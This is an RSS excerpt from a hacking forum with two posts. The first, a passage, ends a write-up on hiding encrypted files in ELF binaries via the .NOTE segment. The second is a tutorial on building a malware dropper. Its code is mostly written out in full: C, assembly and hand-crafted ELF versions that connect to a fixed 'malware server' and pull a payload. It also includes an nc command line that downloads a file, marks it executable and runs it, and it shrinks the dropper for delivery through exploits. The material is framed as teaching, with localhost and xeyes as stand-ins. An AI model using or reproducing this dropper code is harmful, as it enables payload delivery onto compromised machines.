                                /*save coordinates to our roadmap*/
 		map.offset = cave_offset;
 		map.size = st.st_size;
 	//	map.size = cave_length;	

 		break;
 	}

 }
 free(secret_file); }
</code></pre>
</li>
<li>
<p>Then inject the coordinates into the .NOTE segment of the ELF binary, as a roadmap to help locate the Encrypted file for extraction.</p>
<pre><code> /*Save secret file coordinates in struct and write as a roadmap to .Note
 * @offset = address of where secret file is located in binary
* @length = length of bytes of secret file in binary*/
void write_roadmap()

   {

     Elf64_Ehdr *ehdr ; Elf64_Phdr *phdr; Elf64_Shdr *shdr;
     ehdr = (Elf64_Ehdr *)host.host;
	    phdr = (Elf64_Phdr *)&amp;host.host[ehdr-&gt;e_phoff];

    for(int i=0;i&lt;ehdr-&gt;e_phnum;i++)
    {
 	if(phdr[i].p_type==PT_NOTE)
 	{
 
 	
 		if(sizeof(struct secret_map)&lt;=phdr[i].p_filesz)
 		{
 			printf("[+]Secret roadmap struct can fit in .Note\n");
 
 			/*Malloc struct*/
 			struct secret_map *structure = malloc(sizeof(struct secret_map));
 			structure-&gt;offset = map.offset;
 			structure-&gt;size = map.size;
 				
 			/*memcopy struct to start of note*/
 			memcpy((host.host+phdr[i].p_offset),structure,sizeof(struct secret_map));

 			
 			free(structure);

 			printf("[+]Secret roadmap injected into .Note segment\n");
 		}
 		else
 		{
 			printf("[-]Secret roadmap struct to small for .NOTE\n");
 		}
 		
 		break;
 	}	
          }
         }
</code></pre>
</li>
</ol>
<p>Reading An Encrypted File from Binary Algorithm (Extraction)</p>
<ol>
<li>
<p>Check Elf binary to see if there is a roadmap struct, by Reading the .NOTE section. You’ll know if a roadmap exists or not, as When reading the struct you’ll receive some sort of error.</p>
</li>
<li>
<p>Once you have the roadmap, then use the roadmap to locate where the Encrypted File is in the binary and extract the Encrypted File from the Binary onto the Heap. Then Write the allocated memory into a file. Thus we have extracted the Encrypted File. And then the User can then use their private key to unencrypted the file for whatever use they needed that encrypted File for.</p>
<pre><code>/*Read structure from .Note*/
void read_roadmap()
{
 Elf64_Ehdr *ehdr; Elf64_Phdr *phdr;
 
 ehdr = (Elf64_Ehdr *)host.host;
 phdr = (Elf64_Phdr *)&amp;host.host[ehdr-&gt;e_phoff];

 struct secret_map *structure = malloc(sizeof(struct secret_map));

 for(int i=0;i&lt;ehdr-&gt;e_phnum;i++)
 {
 	if(phdr[i].p_type==PT_NOTE)
 	{
 		memcpy(structure,host.host+phdr[i].p_offset,sizeof(struct secret_map));
 		break;
 	}
 }

 map.offset = structure-&gt;offset;
 map.size = structure-&gt;size;

 printf("[+]Obtained roadmap from .NOTE segment\n");
 
 free(structure);	
 }
void read_secret_file()
{
 /*useing map to obtain the location of secret file*/
 read_roadmap();

 /*mmap some memory enough on the heap to get file from binary into allocated memory*/
 char *buf = malloc(sizeof(char)*map.size);

 /*memcpy into buf*/
 memcpy(buf,host.host+map.offset,map.size);
 
 /*write to a temp "key" file*/
 FILE *fd = fopen(sfile,"a+");

 fwrite(buf,map.size,1,fd); 

 fclose(fd);	

}
</code></pre>
</li>
</ol>
<p><strong>Why Encrypted Files</strong></p>
<p>If you inject Unencrypted Data into a binary File. If you just Open the binary in a text editor such as vim, It’s actually pretty simple to find any important data in there, as it’s usually in plain English. Which why it is important It should be encrypted Files. Unless you’re are reading/writing the bytes themselves.</p>
<p><strong>Improvements</strong></p>
<ol>
<li>Split the encrypted file and break it apart into smaller code caves, so it makes it harder to piece together.<br>
2. Align the .NOTE section properly to not give any warnings or indication there is something in there…</li>
</ol>
<p><strong>Security</strong></p>
<p>This is just a another layer of security and extra step in trying to Hide important data for a hacker. You could say That all they need to find is the roadmap struct within the .note. Which is true, but to anyone else, Know one knows there is a struct located in the .NOTE segment. And even then, in order to read it correctly, you’ll need to understand what type of struct is there, the size etc.</p>
<p>Essentially Creating an Extra step, extra work for the hacker, And depending on the hacker’s skill level, hiding an encrypted File inside an unsuspecting Executable, could be enough to deter them from actually looking and dissecting the binary. Essentially skill level or laziness could stop them from going further, and they may just assume the executable is just an executable with nothing interesting inside.</p>
<p>Remember this is just a basic prototype, there are many ways to make it much harder to find sensitive data.</p>
<p><strong>Notes</strong></p>
<p>This is only works currently with PIE , position independent executable. I plan on improving on this concept to improve security, hiding it better, as well as being able to inject into other types of executable ELF types within Linux. This is just a proof of concept. There are a few potential bugs. But like I say this is just a proof of concept, and spark some more creativity in the community</p>
<p><strong>Demonstration Screenshots</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/2/2299264deb70838a100e5ad3e29ee71d97bbdd5e.png" data-download-href="/uploads/short-url/4W4m2L6WopdOARFc2vzvFfV3grY.png?dl=1" title="Screenshot from 2020-09-29 14-13-27" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/2/2299264deb70838a100e5ad3e29ee71d97bbdd5e_2_690x431.png" alt="Screenshot from 2020-09-29 14-13-27" data-base62-sha1="4W4m2L6WopdOARFc2vzvFfV3grY" width="690" height="431" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/2/2299264deb70838a100e5ad3e29ee71d97bbdd5e_2_690x431.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/2/2299264deb70838a100e5ad3e29ee71d97bbdd5e_2_1035x646.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/2/2299264deb70838a100e5ad3e29ee71d97bbdd5e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/2/2299264deb70838a100e5ad3e29ee71d97bbdd5e_2_10x10.png"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/0/40ce011063333b971acc135b833f5e2d683b192f.png" data-download-href="/uploads/short-url/9fhV2oxe7YZXyTuf3RqCFO6hjNJ.png?dl=1" title="Screenshot from 2020-09-29 14-13-44" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40ce011063333b971acc135b833f5e2d683b192f_2_690x431.png" alt="Screenshot from 2020-09-29 14-13-44" data-base62-sha1="9fhV2oxe7YZXyTuf3RqCFO6hjNJ" width="690" height="431" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40ce011063333b971acc135b833f5e2d683b192f_2_690x431.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40ce011063333b971acc135b833f5e2d683b192f_2_1035x646.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/0/40ce011063333b971acc135b833f5e2d683b192f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40ce011063333b971acc135b833f5e2d683b192f_2_10x10.png"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/1/511017674f821b603729799e5312f4ab744c5b0d.png" data-download-href="/uploads/short-url/bz79lJrABCjHSKJdvheNvggQZXL.png?dl=1" title="Screenshot from 2020-09-29 14-14-56" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/1/511017674f821b603729799e5312f4ab744c5b0d_2_690x431.png" alt="Screenshot from 2020-09-29 14-14-56" data-base62-sha1="bz79lJrABCjHSKJdvheNvggQZXL" width="690" height="431" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/1/511017674f821b603729799e5312f4ab744c5b0d_2_690x431.png, https://0x00sec.s3.amazonaws.com/optimized/3X/5/1/511017674f821b603729799e5312f4ab744c5b0d_2_1035x646.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/1/511017674f821b603729799e5312f4ab744c5b0d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/5/1/511017674f821b603729799e5312f4ab744c5b0d_2_10x10.png"></a></div><p></p>
<p><strong>Full Code Available Here</strong></p>
<p>My code only accepts .GPG files, meaning it refuses to inject Files which have not been encrypted with GPG. And again it’s a quick prototype, there are a few bugs, and the error checking isn’t really implemented properly, as it’s a very quick prototype proof of concept</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/digitalXmage/HideMe" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/3X/8/7/87821f82cacd56abc33104aba5594aa42b038be4.jpeg" class="thumbnail onebox-avatar" width="360" height="360">

<h3><a href="https://github.com/digitalXmage/HideMe" target="_blank" rel="noopener nofollow ugc">digitalXmage/HideMe</a></h3>

<p>Hide Encrypted .gpg Files inside an unsuspecting Binary Executable - digitalXmage/HideMe</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><strong>Conclusion</strong></p>
<p>I Hope someone has learnt something from this. Or if not, at least open some doors in terms of creativity. This is my first Actual Write up post. Lets Hope it’s not completely useless…</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/hide-encrypted-files-inside-unsuspecting-binaries/23323">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/hide-encrypted-files-inside-unsuspecting-binaries/23323</link>
          <pubDate>Tue, 29 Sep 2020 14:14:38 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23323</guid>
          <source url="https://d.clarkee.co.uk/t/hide-encrypted-files-inside-unsuspecting-binaries/23323.rss">Hide Encrypted Files inside unsuspecting Binaries</source>
        </item>
        <item>
          <title>Programming for Wannabes. Part V. A Dropper</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>So far we have been much focused on reverse engineering, but everybody knows that in order to become a hacker you have to master much more than that. So in this installment we will be moving forward and making use of all the stuff we had learned till now in order to get started with network programming.</p>
<p>We will start with something very simple but that will allow us to use everything we had already learnt at the same time that we dive into networking. For this purpose we will be writing a dropper.</p>
<p>A dropper is a program, usually very small, so it gets more chances to get transferred to a remote machine and whose goal is to download other files, usually bigger parts of some malware too big to fit as part of an exploit.</p>
<p>This may sound cool to some of you, but we are basically going to write a program to transfer files between two machines. And we will try to make this program very, very small. Hopefully this will throw some light about that question on which language you should use to write malware…</p>
<h1>A simple dropper</h1>
<p>Let’s start writing our dropper in C. The program is going to be very simple. We will create a TCP connection to some fixed machine and write to <code>stdout</code> anything received from that connection.</p>
<p>In order to test the dropper in your machine, you will need two terminals. One will be play the role of the malware server, i.e. the machine containing a full-fledge malware we want to transfer to the compromised machine. For our purpose this will just be:</p>
<pre><code class="lang-bash">malware_server $ cat /usr/bin/xeyes | nc -l -p $((1111))
</code></pre>
<p>This line simulates a TCP server listening on port <code>0x1111</code> that will send the program <code>xeyes</code> to any one connecting to it. To test this, open another terminal and run the following command:</p>
<pre><code class="lang-bash">compromised_machine $ rm k; nc localhost $((1111)) &gt; k; chmod +x k; ./k
</code></pre>
<p>You can try this line and get those fancy eyes up following your mouse on the screen.</p>
<p>So, what we are going to write is a program to do what <code>nc</code> does in the example above. Yes, you can use <code>nc</code> or similar tools whenever possible, but we are here trying to be wannabees… and for that we need to be able to build any single tool we will every use… that’s the difference between script kids and hackers… I think <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h1>Minimal C Dropper</h1>
<p>So let’s take a look to a minimal dropper, and let’s use that code to introduce new C language concepts and start our journey. The code is this:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;

#define BUF_SIZE 1024

int main (void) {
  int                s, l;
  unsigned long      addr =  0x0100007f11110002; // Define IP the hacker way :)
  unsigned char      buf[BUF_SIZE];

  
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) return -2;
  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0)         return -3;
  
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) &lt;= 0) break;
    write (1, buf, l);
    if (l &lt; BUF_SIZE) break;
  }
  close (s);
  
  return 0;
  
}
</code></pre>
<p>Not bad. You already know everything about the header files. the <code>main</code> function and how to declare basic integer variables of different sizes, so I will not insist on this anymore. The rest of the code only contains stuff you already know, except for the <code>while</code> loop. But we will get to it eventually.</p>
<p>So the first thing we find is a call to a function named <code>socket</code>. This is actually a system call and in that sense it is not different of the <code>_exit</code> or <code>write</code> system call we were using in the previous instalments. This just do something different.</p>
<p>The <code>socket</code> system call allows us to create a socket. In the same way than a file allows us to use the hard drive (and I know we haven’t talked about this yet), a socket is the way the operating system give to us in order to use network interface.</p>
<p>The socket can be of different types. Just like the files that can be text or binary files, sockets also have different types. For now, and in order to keep this simple, we will just care about internet sockets or, being more pro TCP/IP. The first and third parameter we pass to <code>socket</code> defines that. The second parameter indicates the type of connection we want. It can be a <code>STREAM</code> connection like in this code, or a <code>DGRAM</code> <em>connection</em> (actually this is used for connection-less communications). Without going into protocol details, a <code>SOCK_STREAM</code> allows us to talk <code>TCP</code>, while a SOC_DGRAM` allows us to speak ‘UDP’.</p>
<p>Therefore, the first code line in the program creates a path to the network hardware and also tell the operating system that we want to talk to a remote machine over the Internet and using TCP.</p>
<p><em>There are other types of Protocol Families and socket types. But for the time being, just pay attention to the second parameter and that will be enough to write a whole bunch of tools</em></p>
<h1>Connecting</h1>
<p>You may had noted that the type of our socket is `STREAM, so our communication will flow like a stream, but, before we can do that, we need to set where to connect this stream. Using technical jargon, TCP is an connection-oriented protocol, meaning than, before any data can be exchanged a connection needs to be established. Once established we can just write and read data from the socket and that data will go to the right machine automatically.</p>
<p>This is different to the <code>DGRAM</code> type where, there is no connection, and for each piece of data we want to send (this is called technically a datagram) we always need to indicate the destination.</p>
<p>In other words. TCP is like making a phone call and UDP is like sending a letter.</p>
<p>So, we need to make the call, and this is done with the <code>connect</code> system call. Yes. This is also a system call so we are still in our comfort zone.</p>
<p>As TCP is a so-called transport protocol it defines the network locations as network addresses and ports. In general a network address identifies a machine and a port a service within that machine. So, we need to specify an IP address and a port. In our case we will be using local host (<code>127.0.0.1</code>) and port <code>0x1111</code>… the values we used at the very beginning of the text with our <code>nc</code> example.</p>
<p>In order to specify this, we would usually make use of a C structure, but we haven’t talked about structures yet… Well we can briefly talk about them right now. A structure is a compound data type that allows us to pack together multiple simple datatypes. In general, everything we declare in a structure is stored in memory in sequence, that means that we can always access that memory using different ways.</p>
<p>In our example, we are not using the structure, but if we did, it will look like this:</p>
<pre><code class="lang-auto">struct ip_addr {
	unsigned short family;
	unsigned short port;
	unsigned char ip[4];
}
</code></pre>
<p>When using the structure we can access the different fields using the identifier indicated inside the <code>struct</code> declaration. In this case, the whole structure is 8 bytes long so it fits in a <code>long</code>. And that is what we had done in our program.</p>
<pre><code> 0x0100007f11110002 -&gt; 01    --&gt; 01
                       00    --&gt; 00
    				   00    --&gt; 00
	    			   7f    --&gt; 127
		    		   1111  --&gt; Port
			    	   0002  --&gt; Address Family
</code></pre>
<p>So both things are actually the same thing. However, note that for normal programs (those that are not that cool as this one we are writing right now), you shouldn’t do this. Structures are there for good reasons, usually to ensure portability and make your program work with other protocol families, and addresses formats.</p>
<p>Anyway… that long number is all the information we need to connect to our malware server.</p>
<p>The last parameter to <code>connect</code> is the length of the structure passed as second parameter. Yes, it is 16 and not 8. The original structure, named <code>struct sockaddr</code> has a 8 bytes padding field. The size is required in order to support other protocols, where the machines or services are addressed in a different way and may need more or less space to get stored. Think for instance on Bluetooth where the devices are addressed using is BT address (kind of a MAC address).</p>
<p>So, the <code>connect</code> system call does all the TCP magic (send those <code>SYNC</code> and <code>SYNC/ACK</code> packets you may have heard about) and connects our socket (the one we created using <code>socket</code>) with the remote machine we specified in the address. At this point, anything we write in each of the ends of the connection will just get to the other side.</p>
<h1>Save the data</h1>
<p>Now we just need to read what the server is sending and drop it somewhere. Instead of opening a file and save the data directly there we had opted to write to <code>stdout</code> and let the shell redirection operations do the magic. Exactly as shown at the beginning with <code>nc</code>.</p>
<p>The code that does this is repeated here for the readers convenience:</p>
<pre><code class="lang-auto">  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) &lt;= 0) break;
    write (1, buf, l);
    if (l &lt; BUF_SIZE) break;
  }

</code></pre>
<p>This is a <code>while</code> loop. Basically it repeats whatever is after the <code>while (cond)</code> while the condition is true. In the example above we have set what is known as an infinite loop. As the condition is always true, the block affected by the <code>while</code> will repeat forever… Well actually until we leave it with the <code>break</code> keyword.</p>
<p>With this information, and making use of our knowledge about the <code>write</code> system call from previous instalments, we can easily infer that the <code>read</code> system call will read data from the indicated file descriptor (in this case it is a socket so data will be read from the network) and stores it in the indicated buffer. It will try to read as many data as the third parameter specify. As all other system calls, it will return <code>-1</code> in case of error. Otherwise <code>read</code> returns the number of bytes actually read. So we will be reading data from the network in blocks of <code>BUF_SIZE</code> bytes or less until there is nothing left (<code>read</code> will return 0 in that case) or an error occurs.</p>
<p>Then, the data we have just read we will write to <code>stdout</code> (remember file descriptor 1). The loop will finish whenever we read a block from the network with a size less than the designated buffer size.</p>
<p>Now we can compile our C program and test it using the setup we described earlier in this text.</p>
<p>In one console let’s launch the server:</p>
<pre><code>malware_server $ cat /usr/bin/xeyes | nc -l -p $((0x1111))
</code></pre>
<p>In other console, let’s compile and launch our dropper. I have named it <code>nwget_basic.c</code></p>
<pre><code>compromised_machine $ make nwget_basic
compromised_machine $ rm k; ./nwget_basic &gt; k; chmod +x k; ./k
</code></pre>
<p>If everything goes well, you should see those eyes staring at your mouse pointer</p>
<h1>Shrinking the dropper</h1>
<p>Sometimes getting a file into a machine is tricky. This may happen even with non security related scenarios. I have been in those cases were I need to transfer a file into a machine that does not have any tool to transfer files… Once I had <code>ssh</code> access to it but no <code>scp</code>. In general, if you can get to a shell in the machine there should be some way to get your files also there, but that is not always easy.</p>
<p>In other occasions, you just have a exploit that allows you to run a very small code, or transfer a few bytes. Anyway, in general, the smaller your dropper the better so we are going to shrink it as much as we could. And we already know how to do this, so I will just go quick with this. We will just substitute the system calls for assembly versions and get rid of the libc.</p>
<p>You can find the code in my github and try to recompile it yourself… or even better, you can try to write it based on what we discussed on Part II. Using this technique I manage to get my dropper down to 1.8Kb static binary (that means that I do not depend on any specific library whatsoever).</p>
<p>But we can do way better re-writing it in asm.</p>
<h1>pwget (picoWget)</h1>
<p>No, the name is not because of me. It is because the previous one was <code>nwget</code> or nanoWget, so we are going smaller this time. <code>pwget</code> is the direct asm translation of <code>nwget</code> and this is how it looks like:</p>
<pre><code class="lang-auto">section	.text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -&gt; s (socket)
	;; [rbp + 0x08] -&gt; len (int)
	;; [rbp + 0x10] -&gt; buf (unsigned char)
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov  rdi, 2		; PF_INET 2
	mov  rsi, 1		; SOCK_STREAM
	mov  rdx, 6     ; IPPROTO_TCP
	mov  r8, 10 
	call _socket
	mov  [rbp + 0x00], rax	; Store socket in stack
	cmp  rax, 0
	jle  error

	;; connect (s [rbp+0], addr, 16)
	mov  rdi, rax
	lea  rsi, [rel addr]
	mov  rdx, 16
	mov  r8, 20
	call _connect
	test eax, eax
	jl error

l0:	; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	mov rdi, 2
	lea rsi, [rel msg]
	mov rdx, 7
	call _write
	
	mov rdi, r9
	add rdi, r8
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	syscall
	ret
	
_write:
	mov rax, 1
	syscall
	ret
	
_socket:
	mov rax, 41
	syscall
	ret
	
_connect:
	mov rax, 42
	syscall
	ret
	
_close:	mov rax, 3
	syscall
	ret
	
_exit:	mov rax, 60
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db "ERROR", 10,0

</code></pre>
<p>Despite the <code>jX</code> instruction everything should look very familiar and easy to understand to you. As I said this is the literal translation of the C program we had just discussed. The <code>jX</code> instruction performs jump based on the flag values. Flags get updated by the ALU whenever any logic or arithmetic operation is performer. The flags usually stored in a special register and each flag is a bit of that register. This way when using for instance the instruction <code>cmp</code> that allows us to compare two values, the <code>zero</code> flag will get activated when both values are equal and the <code>sign</code> flag will be activated depending on the result of the substraction of both values.</p>
<p>This way, after running a <code>cmp</code> instruction we can jump if the result of the comparison is <code>less than</code> with a <code>jl</code> or <code>less than or equal</code> with a <code>jle</code>… It is just that simple. Just look for the conditional jump instructions list for your processor and take a look to the available mnemonics.</p>
<p>This asm, once compiled and <code>stripped</code> goes down to 584 bytes. That is quite small.</p>
<h1>Getting rid of everything else</h1>
<p>Obviously our code is less than 500 bytes, so the file has still some information there that shouldn’t be strictly necessary. If we run it through <code>readelf</code> we will see still some remaining information:</p>
<pre><code class="lang-auto">$ readelf -a pwget
$ readelf -a pget
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400080
  Start of program headers:          64 (bytes into file)
  Start of section headers:          392 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         1
  Size of section headers:           64 (bytes)
  Number of section headers:         3
  Section header string table index: 2

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000400080  00000080
       00000000000000f6  0000000000000000  AX       0     0     16
  [ 2] .shstrtab         STRTAB           0000000000000000  00000176
       0000000000000011  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x0000000000000176 0x0000000000000176  R E    0x200000

 Section to Segment mapping:
  Segment Sections...
   00     .text

There is no dynamic section in this file.

There are no relocations in this file.

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

No version information found in this file.

</code></pre>
<p>We can do better, completely crafting our ELF file. And this will bring us to <code>fwget1</code></p>
<h1>fwget (FemtoWget)</h1>
<p>This has already been mentioned in the forum. You can refer to <a href="https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7">this</a> to see what we are talking about and based on that, we will get something like this:</p>
<pre><code class="lang-auto">BITS 64
	        org 0x400000
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr


	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -&gt; s (socket)
	;; [rbp + 0x08] -&gt; len (int)
	;; [rbp + 0x10] -&gt; buf (unsigned char)
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	call _socket
	
	mov [rbp + 0x00], rax
	cmp rax, 0
	jle error
	

	;; connect (s [rbp+0], addr, 16)
	mov rdi, rax
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	mov rsi, 0x0100007f11110002
	lea rsi, [rel addr]
	mov rdx, 16
	call _connect
	test eax, eax
	jl error

l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	;; mov rdi, 2
	;; lea rsi, [rel msg]
	;; mov rdx, 7
	;; call _write
	
	mov rdi, -1
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	jmp _do_syscall
	
_write:
	mov rax, 1
	jmp _do_syscall
	
_socket:
	mov rax, 41
	jmp _do_syscall
	
_connect:
	mov rax, 42
	jmp _do_syscall
	
_close:
	mov rax, 3
	jmp _do_syscall
	
_exit:
	mov rax, 60
	jmp _do_syscall

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db "ERROR", 10,0
filesize equ $ - $$

</code></pre>
<p>The code is identical to <code>pwget</code> but we have added the ELF metadata manually and also removed the <code>.data</code> section and added the data we need directly on the <code>.text</code> segment. When compiled the program goes down to 327 bytes. What is very good… but we can do better</p>
<h1>Iteration 2</h1>
<p>For starters let’s remove the error checking for the <code>socket</code> system call. Sure it may fail, but that is very unlikely so that is a reasonable risk. We will also store the socket in a register instead of in the stack. We have plenty of registers that we are not using, so let’s put them to work. We will use <code>r8</code> for this purpose and, therefore all references to <code>[rbp + 0x00]</code> will be gone.</p>
<p>We will also use the 32bits version of some registers in some operations. Opcodes involving 32bits registers are shorter. For instance:</p>
<pre><code>cmp rax, 0  -&gt; 48 83 f8 00
cmp eax, 0  -&gt; 83 f8 00
</code></pre>
<p>And also combine this with classical optimisations like using <code>xor</code> to set register to zero instead of <code>mov</code></p>
<pre><code>mov    rdi,0x0   --&gt; 48 c7 c7 00 00 00 00
     ||
	 \/
xor    rdi,rdi   --&gt; 48 31 ff
     ||
	 \/
xor    edi,edi   --&gt; 31 ff
</code></pre>
<p>Using this tricks we made the binary go down to 304 bytes… but we can do better</p>
<h1>Iteration 3</h1>
<p>For iteration 3 we are going to remove unneeded code. Actually it is not unneeded and in the general case is code that has to be there. For this specific case were our objective is to make the program as small as we can, we can overlook this.</p>
<p>We are removing in this iteration:</p>
<ul>
<li>Error code check for the <code>connect</code> system call… Basically in this case it doesn’t matter if the program fails in an ordered way or it just doesn’t work. The overall result is the same</li>
<li>
<code>close</code> syscall in the socket. All file descriptors are closed automatically by the OS when the process ends, so we can also save that one.</li>
</ul>
<p>Regarding the code, we optimised the way <code>rax</code> is set for the different syscalls.</p>
<pre><code> mov rax, 41  -&gt; 48 c7 c0 29 00 00 00
    ||
	\/
 xor eax,eax  -&gt; 31 c0
 add eax,41   -&gt; 83 c0 29
</code></pre>
<p>With this changes we have gone down to 273 bytes… But we can do better</p>
<h1>Iteration 4</h1>
<p>In the iteration 4 we go even more aggressive. Let’s take a look to the changes</p>
<p>First, we reuse the 8 bytes reserved in the ELF header to add the initial code instructions. Something like this:</p>
<pre><code class="lang-auto">BITS 64
                  org 0x400000
    ehdr:                                                 ; Elf32_Ehdr
                  db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
  _start: 
                  push rbp                ; 55
                  mov  rbp, rsp           ; 48 89 e5
                  xor esi,esi
                  jmp _start1             ; eb XX

                  dw      2                               ;   e_type
                  dw      0x3e                            ;   e_machin
                  dq      _start                          ;   e_entry

</code></pre>
<p>As you can see, we can actually use only 6 bytes in the header as the last 2 are needed to jump into the rest of the code</p>
<p>We also removed the exit code… as we do not really care in this case and changed some instructions to use 32bits registers, saving a few bytes.</p>
<p>With this changes we go down to 263 bytes. As you can imagine from this point on, we are just saving a few bytes in each iteration, but let’s see how far can we get.</p>
<h1>Iteration 5</h1>
